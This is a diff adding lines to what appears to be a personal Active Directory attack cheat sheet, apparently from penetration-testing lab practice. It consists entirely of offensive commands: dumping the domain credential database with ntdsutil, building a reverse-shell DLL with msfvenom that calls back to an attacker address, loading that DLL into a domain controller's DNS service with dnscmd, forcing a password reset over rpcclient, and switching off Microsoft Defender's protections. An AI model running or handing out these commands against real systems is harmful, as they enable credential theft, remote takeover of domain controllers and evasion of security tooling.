@@ -1,3 +1,11 @@
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full $env:TEMP' q q"    (local dcsync)
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.57 LPORT=1337 -f dll -o shell.dll
+
+dnscmd.exe /config /serverlevelplugindll \\10.10.14.57\s\shell.dll;sc.exe \\DCName stop dns;sc.exe \\DCName start dns    (Needs to be on DNSADMINS group)
+
+rpcclient $> setuserinfo2 {username} 23 {password}    (Needs ForceChangePassword DACL)
+
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend    (Disable Defender)
+
+Get-MpPreference | Select-Object -Property ExclusionPath -ExpandProperty ExclusionPath   (get defender exclusion paths)
